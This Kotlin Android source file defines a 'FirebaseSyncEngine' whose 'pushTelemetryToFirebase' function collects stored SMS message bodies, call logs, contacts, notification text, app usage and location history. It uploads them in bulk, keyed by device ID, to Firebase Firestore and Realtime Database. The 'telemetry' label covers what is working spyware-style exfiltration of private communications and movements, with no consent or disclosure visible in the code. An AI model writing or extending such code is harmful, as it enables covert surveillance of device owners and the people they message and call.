package com.example.data.sync

import android.content.Context
import android.os.Build
import android.provider.Settings
import android.util.Log
import com.example.data.local.AppDatabase
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.firestore.FirebaseFirestore
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

class FirebaseSyncEngine(private val context: Context) {

    private val db = AppDatabase.getInstance(context)
    private val deviceId: String by lazy {
        try {
            Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "DEVICE_${Build.MODEL}"
        } catch (_: Exception) {
            "DEVICE_${Build.MODEL}"
        }
    }

    suspend fun pushTelemetryToFirebase(): Boolean = withContext(Dispatchers.IO) {
        var firestoreSuccess = false
        var rtdbSuccess = false

        // Fetch all local synced records from Room DB
        val smsList = try { db.smsDao().getAllSmsSync() } catch (e: Exception) { Log.e("FirebaseSyncEngine", "Error loading SMS: ${e.message}"); emptyList() }
        val callLogs = try { db.callLogDao().getAllCallLogsSync() } catch (e: Exception) { Log.e("FirebaseSyncEngine", "Error loading Calls: ${e.message}"); emptyList() }
        val contacts = try { db.contactDao().getAllContactsSync() } catch (e: Exception) { Log.e("FirebaseSyncEngine", "Error loading Contacts: ${e.message}"); emptyList() }
        val notifications = try { db.notificationDao().getAllNotificationsSync() } catch (e: Exception) { Log.e("FirebaseSyncEngine", "Error loading Notifications: ${e.message}"); emptyList() }
        val appUsage = try { db.appUsageDao().getAllAppUsageSync() } catch (e: Exception) { Log.e("FirebaseSyncEngine", "Error loading Usage: ${e.message}"); emptyList() }
        val locationList = try { db.locationDao().getAllLocationsSync() } catch (e: Exception) { Log.e("FirebaseSyncEngine", "Error loading Locations: ${e.message}"); emptyList() }
        val deviceInfo = try { DeviceInfoSyncManager(context).collectAndSyncDeviceInfo() } catch (e: Exception) { Log.e("FirebaseSyncEngine", "Error loading DeviceInfo: ${e.message}"); null }
        val location = try { LocationSyncManager(context).captureAndSyncLocation() } catch (e: Exception) { Log.e("FirebaseSyncEngine", "Error loading Location: ${e.message}"); null }

        val timestamp = System.currentTimeMillis()

        val devicePayload = mapOf(
            "deviceId" to deviceId,
            "model" to (deviceInfo?.deviceModel ?: Build.MODEL),
            "carrier" to (deviceInfo?.carrierName ?: "Unknown"),
            "battery" to (deviceInfo?.batteryLevel ?: 100),
            "isCharging" to (deviceInfo?.isCharging ?: false),
            "latitude" to (location?.latitude ?: 0.0),
            "longitude" to (location?.longitude ?: 0.0),
            "networkType" to (deviceInfo?.networkType ?: "Unknown"),
            "simState" to (deviceInfo?.simState ?: "UNKNOWN"),
            "lastSyncTimestamp" to timestamp
        )

        // 1. Sync to Firebase Firestore
        try {
            val firestore = FirebaseFirestore.getInstance()
            val deviceRef = firestore.collection("enterprise_devices").document(deviceId)
            deviceRef.set(devicePayload)

            // Push SMS subcollection
            smsList.forEach { sms ->
                deviceRef.collection("sms_logs").document(sms.id.toString()).set(
                    mapOf(
                        "id" to sms.id,
                        "address" to sms.address,
                        "messageBody" to sms.messageBody,
                        "timestamp" to sms.timestamp,
                        "type" to sms.type,
                        "threadId" to sms.threadId
                    )
                )
            }

            // Push Call Logs subcollection
            callLogs.forEach { call ->
                deviceRef.collection("call_logs").document(call.id.toString()).set(
                    mapOf(
                        "id" to call.id,
                        "number" to call.number,
                        "name" to call.name,
                        "type" to call.type,
                        "durationSeconds" to call.durationSeconds,
                        "timestamp" to call.timestamp
                    )
                )
            }

            // Push Contacts subcollection
            contacts.forEach { contact ->
                deviceRef.collection("contacts").document(contact.id.toString()).set(
                    mapOf(
                        "id" to contact.id,
                        "displayName" to contact.displayName,
                        "primaryPhone" to contact.primaryPhone,
                        "secondaryPhone" to contact.secondaryPhone,
                        "email" to contact.email
                    )
                )
            }

            // Push Notifications subcollection
            notifications.forEach { notif ->
                deviceRef.collection("notifications").document(notif.id.toString()).set(
                    mapOf(
                        "id" to notif.id,
                        "packageName" to notif.packageName,
                        "title" to notif.title,
                        "text" to notif.text,
                        "timestamp" to notif.timestamp
                    )
                )
            }

            // Push App Usage subcollection
            appUsage.forEach { usage ->
                deviceRef.collection("app_usage").document(usage.id.toString()).set(
                    mapOf(
                        "id" to usage.id,
                        "packageName" to usage.packageName,
                        "appName" to usage.appName,
                        "totalTimeInForegroundMs" to usage.totalTimeInForegroundMs,
                        "lastTimeUsed" to usage.lastTimeUsed
                    )
                )
            }

            // Push Location history subcollection
            locationList.forEach { loc ->
                deviceRef.collection("locations").document(loc.id.toString()).set(
                    mapOf(
                        "id" to loc.id,
                        "latitude" to loc.latitude,
                        "longitude" to loc.longitude,
                        "accuracy" to loc.accuracy,
                        "provider" to loc.provider,
                        "timestamp" to loc.timestamp
                    )
                )
            }

            firestoreSuccess = true
            Log.d("FirebaseSyncEngine", "Firestore sync complete for device $deviceId with ${smsList.size} SMS, ${callLogs.size} Calls, ${contacts.size} Contacts.")
        } catch (e: Exception) {
            Log.e("FirebaseSyncEngine", "Firestore sync failed: ${e.message}", e)
        }

        // 2. Sync to Firebase Realtime Database
        try {
            val rtdb = FirebaseDatabase.getInstance()
            val deviceRef = rtdb.getReference("devices").child(deviceId)

            deviceRef.child("device_info").setValue(devicePayload)

            if (smsList.isNotEmpty()) {
                val smsMap = smsList.associate { sms -> sms.id.toString() to mapOf(
                    "address" to sms.address,
                    "messageBody" to sms.messageBody,
                    "timestamp" to sms.timestamp,
                    "type" to sms.type,
                    "threadId" to sms.threadId
                ) }
                deviceRef.child("sms_logs").setValue(smsMap)
            }

            if (callLogs.isNotEmpty()) {
                val callMap = callLogs.associate { call -> call.id.toString() to mapOf(
                    "number" to call.number,
                    "name" to call.name,
                    "type" to call.type,
                    "durationSeconds" to call.durationSeconds,
                    "timestamp" to call.timestamp
                ) }
                deviceRef.child("call_logs").setValue(callMap)
            }

            if (contacts.isNotEmpty()) {
                val contactMap = contacts.associate { c -> c.id.toString() to mapOf(
                    "displayName" to c.displayName,
                    "primaryPhone" to c.primaryPhone,
                    "email" to c.email
                ) }
                deviceRef.child("contacts").setValue(contactMap)
            }

            if (notifications.isNotEmpty()) {
                val notifMap = notifications.associate { n -> n.id.toString() to mapOf(
                    "packageName" to n.packageName,
                    "title" to n.title,
                    "text" to n.text,
                    "timestamp" to n.timestamp
                ) }
                deviceRef.child("notifications").setValue(notifMap)
            }

            if (appUsage.isNotEmpty()) {
                val usageMap = appUsage.associate { u -> u.id.toString() to mapOf(
                    "packageName" to u.packageName,
                    "appName" to u.appName,
                    "totalTimeInForegroundMs" to u.totalTimeInForegroundMs,
                    "lastTimeUsed" to u.lastTimeUsed
                ) }
                deviceRef.child("app_usage").setValue(usageMap)
            }

            if (locationList.isNotEmpty()) {
                val locMap = locationList.associate { l -> l.id.toString() to mapOf(
                    "latitude" to l.latitude,
                    "longitude" to l.longitude,
                    "accuracy" to l.accuracy,
                    "provider" to l.provider,
                    "timestamp" to l.timestamp
                ) }
                deviceRef.child("locations").setValue(locMap)
            }

            rtdbSuccess = true
            Log.d("FirebaseSyncEngine", "Realtime Database sync complete for device $deviceId")
        } catch (e: Exception) {
            Log.e("FirebaseSyncEngine", "Realtime Database sync failed: ${e.message}", e)
        }

        firestoreSuccess || rtdbSuccess
    }
}
